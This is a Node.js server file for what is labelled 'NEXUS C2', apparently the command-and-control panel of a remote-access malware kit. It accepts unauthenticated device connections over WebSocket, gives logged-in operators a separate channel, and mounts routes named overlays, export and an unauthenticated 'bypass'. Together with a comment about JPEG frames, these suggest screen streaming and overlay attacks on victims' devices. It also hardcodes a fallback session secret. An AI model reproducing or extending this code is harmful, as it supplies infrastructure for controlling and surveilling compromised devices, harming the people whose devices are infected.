'use strict';
require('dotenv').config();

const http        = require('http');
const path        = require('path');
const fs          = require('fs');
const express     = require('express');
const session     = require('express-session');
const SQLiteStore = require('connect-sqlite3')(session);
const WebSocket   = require('ws');
const compression = require('compression');

const { handleDevice, handleOperator } = require('../core/hub');
const { requireLogin, requireLoginWs } = require('../middleware/auth');
const apiRouter     = require('../routes/api');
const authRouter    = require('../routes/auth');
const overlayRouter = require('../routes/overlays');
const exportRouter  = require('../routes/export');
const bypassRouter  = require('../routes/bypass');

const PORT   = parseInt(process.env.PORT || '3000', 10);
const DB_DIR = path.resolve(
  process.env.DB_PATH ? path.dirname(process.env.DB_PATH) : path.join(__dirname, '../data')
);
fs.mkdirSync(DB_DIR, { recursive: true });

// ── Express ────────────────────────────────────────────────────────────────────
const app    = express();
const server = http.createServer(app);

const sessionMw = session({
  store:             new SQLiteStore({ dir: DB_DIR, db: 'sessions.db' }),
  secret:            process.env.SESSION_SECRET || 'nexus-dev-secret-replace-me',
  resave:            false,
  saveUninitialized: false,
  name:              'nexus.sid',
  cookie: {
    secure:   process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'strict',
    maxAge:   12 * 60 * 60 * 1000,
  }
});

app.set('trust proxy', 1);
app.use(compression({ threshold: 512 }));
app.use(express.json({ limit: '64mb' }));
app.use(express.urlencoded({ extended: true, limit: '64mb' }));
app.use(sessionMw);

// ── Static files ───────────────────────────────────────────────────────────────
app.use('/static', express.static(path.join(__dirname, '../public'), {
  maxAge: process.env.NODE_ENV === 'production' ? '1h' : 0,
  etag:   true,
}));

// ── Routes ─────────────────────────────────────────────────────────────────────
app.use('/', authRouter);
app.use('/api',          requireLogin, apiRouter);
app.use('/api/overlays', requireLogin, overlayRouter);
app.use('/api/bypass',   bypassRouter);
app.use('/api/export',   requireLogin, exportRouter);

app.get('/', requireLogin, (_, res) =>
  res.sendFile('index.html', { root: path.join(__dirname, '../public') })
);

app.get('/health', (_, res) => res.json({ ok: true, ts: Date.now() }));
app.use((_, res) => res.redirect('/'));

// ── WebSocket ──────────────────────────────────────────────────────────────────
const wss = new WebSocket.Server({
  noServer:          true,
  perMessageDeflate: false,   // JPEG already compressed
  maxPayload:        16_777_216, // 16 MB
  clientTracking:    false,
});

server.on('upgrade', (req, socket, head) => {
  const url = req.url.split('?')[0];

  if (url === '/ws/operator') {
    sessionMw(req, {}, () => {
      if (!requireLoginWs(req)) {
        socket.write('HTTP/1.1 401 Unauthorized\r\nConnection: close\r\n\r\n');
        socket.destroy();
        return;
      }
      wss.handleUpgrade(req, socket, head, ws => handleOperator(ws, req));
    });
    return;
  }

  // Device connection — accepts /ws/device, /, or any path with x-device-id header
  if (url === '/ws/device' || url === '/' || req.headers['x-device-id']) {
    wss.handleUpgrade(req, socket, head, ws => handleDevice(ws, req));
    return;
  }

  socket.destroy();
});

// ── Boot ───────────────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n  NEXUS C2  →  http://0.0.0.0:${PORT}`);
  console.log(`  Device WS →  ws://0.0.0.0:${PORT}/ws/device`);
  console.log(`  Op WS     →  ws://0.0.0.0:${PORT}/ws/operator\n`);
});

process.on('uncaughtException',  e => console.error('[!] uncaught:', e.message));
process.on('unhandledRejection', e => console.error('[!] rejection:', e));
